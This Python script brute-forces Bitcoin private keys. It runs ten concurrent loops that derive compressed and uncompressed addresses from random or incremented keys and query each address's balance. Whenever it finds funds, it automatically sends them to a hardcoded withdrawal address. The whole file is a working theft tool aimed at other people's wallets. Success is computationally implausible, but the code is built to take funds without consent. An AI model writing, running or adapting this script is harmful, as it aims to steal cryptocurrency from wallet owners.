import asyncio
import concurrent
from cryptos import Bitcoin, compress
from random import randint

loop = asyncio.get_event_loop()
WITHDRAW_ADDR = '1GtJFqfp4548bEwXjZBuoVF6BneBCTAUrE'

c = Bitcoin()


async def check_balance(addr: str, executor) -> int:
    while True:
        try:
            history = await loop.run_in_executor(executor, c.history,addr)
            return history['final_balance']
        except Exception:
            await asyncio.sleep(10)


async def brute_loop(coro_n):
    executor = concurrent.futures.ThreadPoolExecutor(4)
    ca = 1
    priv_key = randint(2 ** 1, 2 ** 256)
    while True:
        pub_key = await loop.run_in_executor(executor, c.privtopub, priv_key)
        compressed_pub_key = await loop.run_in_executor(executor, compress, pub_key)
        addr = await loop.run_in_executor(executor, c.pubtoaddr, pub_key)
        addr_compressed = await loop.run_in_executor(executor, c.pubtoaddr, compressed_pub_key)
        print(coro_n, ca, addr, addr_compressed, hex(priv_key))
        addr_balance = await check_balance(addr, executor)
        addr_compressed_balance = await check_balance(addr_compressed, executor)
        if addr_balance or addr_compressed_balance:
            value = addr_balance or addr_compressed_balance
            await loop.run_in_executor(executor, c.send, priv_key, WITHDRAW_ADDR, value)
        if not ca % 10000:
            priv_key = randint(2 ** 1, 2 ** 256)
        else:
            priv_key += 1
        ca += 1


async def main():
    tasks = [
        brute_loop(i) for i in range(10)
    ]
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    loop.run_until_complete(main())
